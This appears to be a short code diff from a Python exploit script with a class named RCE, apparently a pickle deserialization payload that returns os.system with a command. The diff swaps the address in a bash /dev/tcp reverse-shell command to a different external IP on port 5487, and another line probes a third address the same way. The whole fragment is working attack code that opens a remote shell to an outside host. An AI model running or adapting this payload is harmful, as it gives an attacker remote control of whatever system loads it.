@@ -42,7 +42,7 @@ class RCE:
         "bash -c \"echo \"test\">/dev/tcp/87.87.87.87/5408\""
         
         #######################
-        return os.system, ("bash -c \"bash &>/dev/tcp/87.87.87.87/5487<&1\"",)
+        return os.system, ("bash -c \"bash &>/dev/tcp/140.115.59.195/5487<&1\"",)
         
 
 def payload():
